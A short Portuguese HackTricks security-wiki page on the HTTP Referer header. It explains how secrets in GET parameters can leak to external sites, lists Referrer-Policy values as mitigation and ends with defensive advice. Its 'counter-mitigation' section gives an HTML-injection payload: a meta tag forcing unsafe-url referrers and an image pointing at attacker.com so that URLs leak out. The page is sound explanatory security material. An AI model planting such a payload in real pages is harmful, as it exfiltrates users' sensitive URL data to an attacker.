{{#include ../banners/hacktricks-training.md}}

# Cabeçalhos e política de Referência

Referência é o cabeçalho usado pelos navegadores para indicar qual foi a página anterior visitada.

## Informações sensíveis vazadas

Se em algum momento dentro de uma página da web, qualquer informação sensível estiver localizada nos parâmetros de uma solicitação GET, se a página contiver links para fontes externas ou um atacante conseguir fazer/sugerir (engenharia social) que o usuário visite uma URL controlada pelo atacante. Isso poderia permitir a exfiltração das informações sensíveis dentro da última solicitação GET.

## Mitigação

Você pode fazer com que o navegador siga uma **política de Referência** que poderia **evitar** que as informações sensíveis sejam enviadas para outras aplicações web:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Contra-Mitigação

Você pode substituir esta regra usando uma tag meta HTML (o atacante precisa explorar uma injeção HTML):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Defesa

Nunca coloque dados sensíveis dentro de parâmetros GET ou caminhos na URL.

{{#include ../banners/hacktricks-training.md}}
